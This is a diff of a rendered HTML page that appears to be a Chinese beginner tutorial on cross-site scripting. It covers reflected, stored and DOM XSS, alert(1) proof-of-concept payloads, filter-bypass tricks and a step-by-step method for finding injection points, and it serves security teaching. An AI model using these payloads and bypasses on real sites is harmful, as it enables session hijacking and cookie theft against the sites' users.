@@ -52,15 +52,17 @@
       
     
     
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0/dist/katex.min.css">
+    
       <link rel="stylesheet" href="../../../../../assets/document_dates/fonts/material-icons.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
-    
-      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/material.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/shift-away.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/tippy.css">
+    
+      <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/scale.css">
     
       <link rel="stylesheet" href="../../../../../assets/document_dates/tippy/light.css">
     
@@ -2401,31 +2403,37 @@
 
   <h1>XSS---如何让别人的浏览器执行你的代码</h1>
 
-<h2 id="xss">前置基础：XSS 需要懂哪些前端知识？</h2>
+<h2 id="xss">前置基础：XSS 需要懂哪些前端知识？<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
 <p>为了更好理解 XSS，我会先快速讲解一些<strong>基础的前端知识</strong>，哪怕你没写过网页也能跟上。</p>
-<h3 id="1-html">1. HTML 是什么？</h3>
+<h3 id="1-html">1. HTML 是什么？<a class="headerlink" href="#1-html" title="Permanent link">&para;</a></h3>
 <ul>
 <li>HTML 是网页的“结构语言”，网页上的内容几乎都是用 HTML 描述的。</li>
 <li>页面会由一个个标签构成，比如：</li>
 </ul>
-<pre><code class="language-html">&lt;html&gt;
-  &lt;head&gt;&lt;title&gt;网页标题&lt;/title&gt;&lt;/head&gt;
-  &lt;body&gt;
-    &lt;h1&gt;主标题&lt;/h1&gt;
-    &lt;p&gt;这是正文段落&lt;/p&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span>
+<span class="normal"><a href="#__codelineno-0-6">6</a></span>
+<span class="normal"><a href="#__codelineno-0-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;&lt;</span><span class="nt">title</span><span class="p">&gt;</span>网页标题<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>主标题<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>这是正文段落<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="image-20250719012824925" src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250719012824925.png" /></p>
 <p>看到这种 <code>&lt;标签&gt;</code> 的东西，就是 HTML。</p>
-<h3 id="2-html">2. HTML 标签的结构：</h3>
-<pre><code class="language-html">&lt;tagname attribute=&quot;value&quot;&gt;内容&lt;/tagname&gt;
-</code></pre>
+<h3 id="2-html">2. HTML 标签的结构：<a class="headerlink" href="#2-html" title="Permanent link">&para;</a></h3>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="p">&lt;</span><span class="nt">tagname</span> <span class="na">attribute</span><span class="o">=</span><span class="s">&quot;value&quot;</span><span class="p">&gt;</span>内容<span class="p">&lt;/</span><span class="nt">tagname</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>例如：</p>
-<pre><code class="language-html">&lt;a href=&quot;https://example.com&quot;&gt;点我跳转&lt;/a&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;https://example.com&quot;</span><span class="p">&gt;</span>点我跳转<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p><code>&lt;a&gt;</code> 是超链接标签，<code>href</code> 是属性，里面是跳转地址，标签中间是显示的内容。</p>
-<h3 id="3">3. 常见标签（可能被注入）：</h3>
+<h3 id="3">3. 常见标签（可能被注入）：<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -2472,12 +2480,12 @@
 </tr>
 </tbody>
 </table>
-<h3 id="4-javascript">4. JavaScript 是什么？</h3>
+<h3 id="4-javascript">4. JavaScript 是什么？<a class="headerlink" href="#4-javascript" title="Permanent link">&para;</a></h3>
 <ul>
 <li>JavaScript 是让网页“动起来”的语言。</li>
 <li>主要运行在浏览器中，XSS 就是利用 JS 来实现攻击。</li>
 </ul>
-<h3 id="5-xss-js">5. XSS 常用 JS 函数：</h3>
+<h3 id="5-xss-js">5. XSS 常用 JS 函数：<a class="headerlink" href="#5-xss-js" title="Permanent link">&para;</a></h3>
 <p>xss中常用的函数：</p>
 <table>
 <thead>
@@ -2530,7 +2538,7 @@
 </tr>
 </tbody>
 </table>
-<h3 id="6-xss-html">6. 可被 XSS 利用的 HTML 属性（事件触发点）</h3>
+<h3 id="6-xss-html">6. 可被 XSS 利用的 HTML 属性（事件触发点）<a class="headerlink" href="#6-xss-html" title="Permanent link">&para;</a></h3>
 <p>这些 HTML 属性可以“绑定 JS 代码”，XSS 就喜欢钻它们的空子：</p>
 <table>
 <thead>
@@ -2566,7 +2574,7 @@
 </tr>
 </tbody>
 </table>
-<h3 id="7-context">7. 什么是上下文（Context）？</h3>
+<h3 id="7-context">7. 什么是上下文（Context）？<a class="headerlink" href="#7-context" title="Permanent link">&para;</a></h3>
 <p>理解上下文可以帮我们知道<strong>代码会被当成什么解释</strong>：</p>
 <ul>
 <li>HTML 上下文：代码会被当成普通标签或内容 → 可尝试插 <code>&lt;script&gt;</code>、<code>&lt;img&gt;</code> 等</li>
@@ -2575,13 +2583,13 @@
 </ul>
 <p><code>&lt;input value="你的输入"&gt;</code>  ← 属性上下文</p>
 <p><code>&lt;script&gt;var name = "{{input}}"&lt;/script&gt;</code> ← JS 字符串上下文</p>
-<h3 id="_1">小结</h3>
+<h3 id="_1">小结<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
 <ul>
 <li>如果你能看懂 HTML 和 JS 的结构</li>
 <li>能理解“代码在哪个位置会怎么执行”</li>
 </ul>
 <p>你就能搞懂 XSS 的原理，也能更好的构造出payload</p>
-<h2 id="_2">前置基础：什么是“跨站”？</h2>
+<h2 id="_2">前置基础：什么是“跨站”？<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
 <ol>
 <li>
 <p>这里的“跨站”其实并不一定非要从别的网站跳到这个站，而是：<strong>攻击者注入代码 → 由其他用户触发 → 在目标网站上执行攻击者的脚本。</strong></p>
@@ -2602,88 +2610,98 @@
 <li>脚本读取了 B 的 cookie，发回攻击者。</li>
 </ol>
 <p>所以：XSS中跨站的本质是 → <strong>“让别人的浏览器执行我写的代码”</strong>。浏览器以为这些代码是 A 网站的合法代码，于是就信任它，从而导致严重后果。</p>
-<h2 id="1-xss">1. 什么是 XSS？</h2>
+<h2 id="1-xss">1. 什么是 XSS？<a class="headerlink" href="#1-xss" title="Permanent link">&para;</a></h2>
 <p><strong>XSS 全称：Cross Site Scripting（跨站脚本攻击）</strong></p>
 <blockquote>
 <p><strong>一句话理解：</strong> XSS 就是把脚本代码“插”进网页里，骗别人浏览并触发这段代码。</p>
 </blockquote>
 <p><strong>举个例子</strong></p>
 <p>你在页面留言板发一条评论：</p>
-<pre><code class="language-javascript">&lt;script&gt;alert('你中招了')&lt;/script&gt;
-</code></pre>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;你中招了&#39;</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>如果网站没做防护，其他用户打开页面时就会弹窗。</p>
-<h3 id="_3">目的</h3>
+<h3 id="_3">目的<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <ul>
 <li>窃取 Cookie / Token（劫持身份）</li>
 <li>假冒用户操作（钓鱼 / 自动发帖）</li>
 <li>执行攻击者指定的JS脚本</li>
 <li>绕过权限、获取内网数据（配合 CSRF 等）</li>
 </ul>
-<h3 id="_4">攻击流程</h3>
+<h3 id="_4">攻击流程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <ol>
 <li>攻击者提交一段脚本代码到网站；</li>
 <li>网站没有过滤/转义这段代码；</li>
 <li>其他用户访问页面时，浏览器执行了攻击者的代码；</li>
 <li>攻击者实现数据窃取、操作伪造等目的。</li>
 </ol>
-<h2 id="3-xss">3. XSS 的三种类型</h2>
+<h2 id="3-xss">3. XSS 的三种类型<a class="headerlink" href="#3-xss" title="Permanent link">&para;</a></h2>
 <p>XSS 主要分为三种类型：<strong>反射型、存储型、DOM 型</strong>。</p>
-<h3 id="_5">反射型</h3>
+<h3 id="_5">反射型<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <ul>
 <li>攻击代码出现在 URL 参数中；</li>
 <li>页面加载时原样反射在页面上并被执行；</li>
 <li>一般用于“一次性攻击链接”。</li>
 </ul>
-<pre><code class="language-html">http://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
-<pre><code class="language-html">&lt;p&gt;你搜索的是：&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;
-</code></pre>
-<h3 id="_6">存储型</h3>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>http://example.com/search?q=<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>你搜索的是：<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_6">存储型<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <ul>
 <li>攻击代码被存入数据库（如评论、昵称、个人签名）；</li>
 <li>页面每次访问时都会加载并执行；</li>
 <li>危害最大、最常见于留言区、论坛、用户资料。</li>
 </ul>
 <p>例如攻击者提交评论内容为：</p>
-<pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>其他人访问页面时自动执行JS。</p>
-<h3 id="dom">DOM 型</h3>
+<h3 id="dom">DOM 型<a class="headerlink" href="#dom" title="Permanent link">&para;</a></h3>
 <ul>
 <li>没有服务器参与，“漏洞”在前端 JS 中；</li>
 <li>攻击代码通过 URL、hash、input 注入；</li>
 <li>页面前端自己用 location.hash、innerHTML 等动态渲染html元素不当操作引起漏洞。</li>
 </ul>
-<pre><code class="language-javascript">// 前端页面中的代码：
-let q = location.hash.substring(1); // 获取URL中“#”开头的片段
-                                                                        // http://example.com/#hello
-                                                                        // console.log(location.hash);  // 输出：#hello
-                                                                        // location.hash.substring(1) 则是把 # 去掉，得到：&quot;hello&quot;
-document.getElementById(&quot;result&quot;).innerHTML = q;
-</code></pre>
+<div class="language-javascript highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span>
+<span class="normal"><a href="#__codelineno-7-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="c1">// 前端页面中的代码：</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="kd">let</span><span class="w"> </span><span class="nx">q</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// 获取URL中“#”开头的片段</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">                                                                        </span><span class="c1">// http://example.com/#hello</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w">                                                                        </span><span class="c1">// console.log(location.hash);  // 输出：#hello</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="w">                                                                        </span><span class="c1">// location.hash.substring(1) 则是把 # 去掉，得到：&quot;hello&quot;</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;result&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">q</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>url输入：</p>
-<pre><code>http://example.com/#&lt;img src=1 onerror=alert(1)&gt;
-</code></pre>
-<h2 id="4-xss">4. 如何触发XSS</h2>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>http://example.com/#&lt;img src=1 onerror=alert(1)&gt;
+</span></code></pre></div></td></tr></table></div>
+<h2 id="4-xss">4. 如何触发XSS<a class="headerlink" href="#4-xss" title="Permanent link">&para;</a></h2>
 <p>触发XSS第一步：打出alert(1)，这代表你成功得到了前端 JS 执行权限。</p>
-<h3 id="payload">常见 payload</h3>
-<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
-&lt;img src=1 onerror=alert(1)&gt;
-&lt;svg/onload=alert(1)&gt;
-&lt;input onfocus=alert(1) autofocus&gt;
-&lt;a href=&quot;javascript:alert(1)&quot;&gt;点我触发&lt;/a&gt;
-&lt;meta/http-equiv=&quot;refresh&quot;/content=&quot;5;url=javascript:alert(1)&gt;
-</code></pre>
-<h3 id="_7">测试建议</h3>
+<h3 id="payload">常见 payload<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h3>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span>
+<span class="normal"><a href="#__codelineno-9-4">4</a></span>
+<span class="normal"><a href="#__codelineno-9-5">5</a></span>
+<span class="normal"><a href="#__codelineno-9-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">1</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>点我触发<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a><span class="p">&lt;</span><span class="nt">meta</span><span class="err">/</span><span class="na">http-equiv</span><span class="o">=</span><span class="s">&quot;refresh&quot;</span><span class="err">/</span><span class="na">content</span><span class="o">=</span><span class="s">&quot;5;url=javascript:alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_7">测试建议<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
 <ul>
 <li>找到你输入的内容会在页面上显示的部分</li>
 <li>先输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>查看是否弹窗、WAF拦截、输入内容被转义</li>
 <li>把页面前端源代码和请求过程都观察一遍，或者观察输入的内容在前端中如何显示，常见触发点<code>location.href</code>、<code>location.replace</code>、<code>window.ioen</code>、<code>eval</code>、<code>postmessage</code>、<code>innerHTML</code>、JavaScript格式化字符串(反引号``)</li>
 </ul>
 <p><strong>更多payload可见</strong>：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p>
-<h2 id="5-xss">5. XSS绕过技巧</h2>
+<h2 id="5-xss">5. XSS绕过技巧<a class="headerlink" href="#5-xss" title="Permanent link">&para;</a></h2>
 <p>XSS 很少直接给你 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 就能执行。<strong>过滤机制</strong>是关键难点。</p>
-<h3 id="_8">常见过滤策略</h3>
+<h3 id="_8">常见过滤策略<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -2715,19 +2733,21 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 </tr>
 </tbody>
 </table>
-<h3 id="_9">其他绕过技巧</h3>
+<h3 id="_9">其他绕过技巧<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
 <ul>
 <li>空格用多种方式替代：<code>/**/</code>,<code>%20</code>,<code>+</code></li>
 <li>大小写混写：ScRipT, AlErT</li>
 <li>HTML 实体编码：<code>&amp;#x3C;</code>; 表示 &lt;</li>
 <li>多种 payload 测试组合：</li>
 </ul>
-<pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
-&lt;svg/onload=alert(1)&gt;
-&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;
-</code></pre>
-<h2 id="6-xss">6. 如何识别和构造 XSS</h2>
-<h3 id="step1">Step1 找注入点</h3>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="6-xss">6. 如何识别和构造 XSS<a class="headerlink" href="#6-xss" title="Permanent link">&para;</a></h2>
+<h3 id="step1">Step1 找注入点<a class="headerlink" href="#step1" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -2769,7 +2789,7 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 </tr>
 </tbody>
 </table>
-<h3 id="step2">Step2 看上下文</h3>
+<h3 id="step2">Step2 看上下文<a class="headerlink" href="#step2" title="Permanent link">&para;</a></h3>
 <p>HTML 中？JS 中？属性中？</p>
 <table>
 <thead>
@@ -2801,7 +2821,7 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 </tr>
 </tbody>
 </table>
-<h3 id="step3-payload">Step3 尝试基础 payload</h3>
+<h3 id="step3-payload">Step3 尝试基础 payload<a class="headerlink" href="#step3-payload" title="Permanent link">&para;</a></h3>
 <table>
 <thead>
 <tr>
@@ -2838,56 +2858,56 @@ document.getElementById(&quot;result&quot;).innerHTML = q;
 </tr>
 </tbody>
 </table>
-<h3 id="step4">Step4 逐步构造绕过</h3>
+<h3 id="step4">Step4 逐步构造绕过<a class="headerlink" href="#step4" title="Permanent link">&para;</a></h3>
 <p>如果基础 payload 被过滤或不执行，需要<strong>逐步调试、尝试绕过技巧</strong>。</p>
 <p><strong>案例一：</strong>页面不显示输入内容？</p>
 <p>页面源码：</p>
-<pre><code class="language-html">&lt;div&gt;Hello {{input}}&lt;/div&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>Hello {{input}}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>输入：</p>
-<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>页面显示：</p>
-<pre><code>Hello 
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>Hello 
+</span></code></pre></div></td></tr></table></div>
 <p>可能被过滤了 script 关键词</p>
 <p>可以将payload改成其他标签的xss的payload：</p>
-<pre><code class="language-html">&lt;svg/onload=alert(1)&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>如果成功弹窗，说明过滤只是黑名单</p>
 <p><strong>案例二：</strong>标签自动闭合</p>
 <p>页面源码：</p>
-<pre><code class="language-html">&lt;p&gt;留言：{{input}}&lt;/p&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>留言：{{input}}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>输入：</p>
-<pre><code class="language-html">&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt;
-</code></pre>
+<div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>形成结构：</p>
-<pre><code class="language-html">&lt;p&gt;留言：&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt;&lt;/p&gt;
-</code></pre>
